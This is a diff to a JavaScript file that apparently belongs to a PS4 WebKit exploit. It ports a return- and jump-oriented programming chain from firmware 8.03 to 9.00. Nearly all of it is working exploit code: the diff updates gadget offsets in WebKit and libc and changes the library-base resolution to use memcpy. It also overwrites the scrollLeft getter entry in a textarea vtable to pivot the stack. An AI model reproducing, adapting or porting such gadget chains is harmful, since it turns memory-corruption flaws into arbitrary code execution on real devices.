@@ -15,6 +15,8 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
+// by janisslsm (John) from ps4-dev discord
+
 import * as config from './config.mjs';
 
 import { Int } from './module/int64.mjs';
@@ -45,12 +47,12 @@ const offset_textarea_impl = 0x18;
 const offset_js_inline_prop = 0x10;
 
 // WebKit offsets of imported functions
-const offset_wk_stack_chk_fail = 0x8d8;
-const offset_wk_strlen = 0x918;
+const offset_wk_stack_chk_fail = 0x178;
+const offset_wk_memcpy = 0x188;
 
 // libSceLibcInternal offsets
-const offset_libc_setjmp = 0x258f4;
-const offset_libc_longjmp = 0x29c58;
+const offset_libc_setjmp = 0x24F04;
+const offset_libc_longjmp = 0x29448;
 
 // see the disassembly of setjmp() from the dump of libSceLibcInternal.sprx
 //
@@ -72,13 +74,17 @@ let libkernel_base = null;
 // libSceLibcInternal.sprx
 let libc_base = null;
 
+// Chain implementation based on Chain803. Replaced offsets that changed
+// between versions. Replaced gadgets that were missing with new ones that
+// won't change the API.
+//
 // gadgets for the JOP chain
 //
 // Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
 // because jop1-5 was the original chain used by the old implementation of
 // Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
 //
-// When the scrollLeft getter native function is called on PS4 8.03, rsi is the
+// When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
 const ta_jop1 = `
 mov rdi, qword ptr [rsi + 0x18]
@@ -95,18 +101,12 @@ call qword ptr [rax + 0xb8]
 // This will make pivoting back easy, just "leave; ret".
 const ta_jop2 = `
 pop rsi
-jmp qword ptr [rax + 0x5f]
+jmp qword ptr [rax + 0x1c]
 `;
 const ta_jop3 = `
 mov rdi, qword ptr [rax + 8]
 mov rax, qword ptr [rdi]
-jmp qword ptr [rax + 0x68]
-`;
-// jop1 was previously used by the old implementation of Chain803, now unused
-const jop1 = `
-mov rdi, qword ptr [rdi + 0x30]
-mov rax, qword ptr [rdi]
-jmp qword ptr [rax + 8]
+jmp qword ptr [rax + 0x30]
 `;
 // rbp is now pushed, any extra objects pushed by the call instructions can be
 // ignored
@@ -114,7 +114,7 @@ const jop2 = `
 push rbp
 mov rbp, rsp
 mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x30]
+call qword ptr [rax + 0x58]
 `;
 const jop3 = `
 mov rdx, qword ptr [rax + 0x18]
@@ -123,7 +123,6 @@ call qword ptr [rax + 0x10]
 `;
 const jop4 = `
 push rdx
-mov edi, 0xac9784fe
 jmp qword ptr [rax]
 `;
 const jop5 = 'pop rsp; ret';
@@ -143,55 +142,56 @@ const jop5 = 'pop rsp; ret';
 const rop_epilogue = 'leave; ret';
 
 const webkit_gadget_offsets = new Map(Object.entries({
-    'pop rax; ret' : 0x0000000000035a1b,
-    'pop rbx; ret' : 0x000000000001537c,
-    'pop rcx; ret' : 0x0000000000025ecb,
-    'pop rdx; ret' : 0x0000000000060f52,
+    'pop rax; ret' : 0x0000000000051a12,
+    'pop rbx; ret' : 0x00000000000be5d0,
+    'pop rcx; ret' : 0x00000000000657b7,
+    'pop rdx; ret' : 0x000000000000986c,
 
     'pop rbp; ret' : 0x00000000000000b6,
-    'pop rsi; ret' : 0x000000000003bd77,
-    'pop rdi; ret' : 0x00000000001e3f87,
-    'pop rsp; ret' : 0x00000000000bf669,
+    'pop rsi; ret' : 0x000000000001F4D6,
+    'pop rdi; ret' : 0x0000000000319690,
+    'pop rsp; ret' : 0x000000000004e293,
 
-    'pop r8; ret' : 0x0000000000097442,
-    'pop r9; ret' : 0x00000000006f501f,
-    'pop r10; ret' : 0x0000000000060f51,
-    'pop r11; ret' : 0x0000000000d2a629,
+    'pop r8; ret' : 0x00000000001a7ef1,
+    'pop r9; ret' : 0x0000000000422571,
+    'pop r10; ret' : 0x0000000000e9e1d1,
+    'pop r11; ret' : 0x0000000000620df9,
 
-    'pop r12; ret' : 0x0000000000d8968d,
-    'pop r13; ret' : 0x00000000016ccff1,
-    'pop r14; ret' : 0x000000000003bd76,
-    'pop r15; ret' : 0x00000000002499df,
+    'pop r12; ret' : 0x000000000085ec71,
+    'pop r13; ret' : 0x00000000001da461,
+    'pop r14; ret' : 0x000000000001f4d5,
+    'pop r15; ret' : 0x000000000031968f,
 
     'ret' : 0x0000000000000032,
-    'leave; ret' : 0x0000000000291fd7,
+    'leave; ret' : 0x000000000008db5b,
 
-    'neg rax; and rax, rcx; ret' : 0x0000000000e85f24,
-    'adc esi, esi; ret' : 0x000000000088cbb9,
-    'add rax, rdx; ret' : 0x00000000003cd92c,
-    'push rsp; jmp qword ptr [rax]' : 0x0000000001abbc92,
-    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
-    'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,
+    'neg rax; and rax, rcx; ret' : 0x00000000019771c4,
+    'adc esi, esi; ret' : 0x000000000148874e,
+    'add rax, rdx; ret' : 0x00000000003f662c,
+    'push rsp; jmp qword ptr [rax]' : 0x0000000002bae87f,
+    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000001b1ed66,
+    'pop rsi; jmp qword ptr [rax + 0x1c]' : 0x00000000021fce7e,
 
-    'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
-    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
-    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
-    'mov rdx, rcx; ret' : 0x0000000000eae9fd,
+    'mov qword ptr [rdi], rsi; ret' : 0x0000000000040300,
+    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc,
+    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b,
+    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c,
+    'mov rdx, rcx; ret' : 0x000000000157fe71,
 
-    [jop1] : 0x000000000028a8d0,
-    [jop2] : 0x000000000076b970,
-    [jop3] : 0x0000000000202698,
-    [jop4] : 0x00000000021af6ad,
+    [jop2] : 0x0000000000683800,
+    [jop3] : 0x0000000000303906,
+    [jop4] : 0x00000000028bd332,
+    [jop5] : 0x000000000004e293,
 
-    [ta_jop1] : 0x00000000005efb14,
-    [ta_jop2] : 0x0000000002198221,
-    [ta_jop3] : 0x00000000014ff7a2,
+    [ta_jop1] : 0x00000000004e62a4,
+    [ta_jop2] : 0x00000000021fce7e,
+    [ta_jop3] : 0x00000000019becb4,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
-    'neg rax; ret' : 0x00000000000d3503,
-    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000ce436,
-    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cede2,
+    'neg rax; ret' : 0x00000000000d3f03,
+    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000cefd9,
+    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cf982,
     'setjmp' : offset_libc_setjmp,
     'longjmp' : offset_libc_longjmp,
 }));
@@ -215,9 +215,9 @@ function get_bases() {
     );
     const libkernel_base = find_base(stack_chk_fail_addr, true, true);
 
-    const strlen_import = libwebkit_base.add(offset_wk_strlen);
-    const strlen_addr = resolve_import(strlen_import, true, true);
-    const libc_base = find_base(strlen_addr, true, true);
+    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
+    const memcpy_addr = resolve_import(memcpy_import, true, true);
+    const libc_base = find_base(memcpy_addr, true, true);
 
     return [
         libwebkit_base,
@@ -232,7 +232,7 @@ function init_gadget_map(gadget_map, offset_map, base_addr) {
     }
 }
 
-class Chain803Base extends ChainBase {
+class Chain900Base extends ChainBase {
     constructor() {
         super();
 
@@ -241,7 +241,7 @@ class Chain803Base extends ChainBase {
         this.flag = new Uint8Array(8);
         this.flag_addr = get_view_vector(this.flag);
         this.jmp_target = new Uint8Array(0x100);
-        rw.write64(this.jmp_target, 0x50, this.get_gadget(jop4));
+        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop4));
         rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
 
         // for save/restore
@@ -381,12 +381,12 @@ class Chain803Base extends ChainBase {
         this.push_constant(0);
         this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');
 
-        // clobbers rax, rdx, rdi, rsp
+        // clobbers rax, rdx, rsi, rsp
         //
         // rsp = rdx
         this.push_gadget('pop rax; ret');
         this.push_value(get_view_vector(this.jmp_target));
-        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x50]');
+        this.push_gadget('pop rsi; jmp qword ptr [rax + 0x1c]');
         this.push_constant(0); // padding for the push
 
         this.rsp_position = this.branch_position;
@@ -475,8 +475,8 @@ class Chain803Base extends ChainBase {
     }
 }
 
-// Chain for PS4 8.03
-class Chain803 extends Chain803Base {
+// Chain for PS4 9.00
+class Chain900 extends Chain900Base {
     constructor() {
         super();
 
@@ -498,10 +498,10 @@ class Chain803 extends Chain803Base {
         this.vtable = vtable;
         this.old_vtable_p = old_vtable_p;
 
-        // 0x1c8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable, 0x1c8, this.get_gadget(ta_jop1));
+        // 0x1b8 is the offset of the scrollLeft getter native function
+        rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
         rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
-        rw.write64(vtable, 0x5f, this.get_gadget(ta_jop3));
+        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
@@ -509,8 +509,8 @@ class Chain803 extends Chain803Base {
         this.rax_ptrs = rax_ptrs;
 
         //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x68, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
         rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
         rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
         // value to pivot rsp to
@@ -538,6 +538,7 @@ class Chain803 extends Chain803Base {
         this.webcore_ta.write64(0, this.old_vtable_p);
     }
 }
+const Chain = Chain900;
 
 function init(Chain) {
     [libwebkit_base, libkernel_base, libc_base] = get_bases();
@@ -550,7 +551,7 @@ function init(Chain) {
     Chain.init_class(gadgets, syscall_array);
 }
 
-function rop(Chain) {
+function test_rop(Chain) {
     const jmp_buf = new Uint8Array(jmp_buf_size);
     const jmp_buf_p = get_view_vector(jmp_buf);
 
@@ -665,5 +666,5 @@ function rop(Chain) {
     }
 }
 
-debug_log('Chain803');
-rop(Chain803);
+debug_log('Chain900');
+test_rop(Chain);
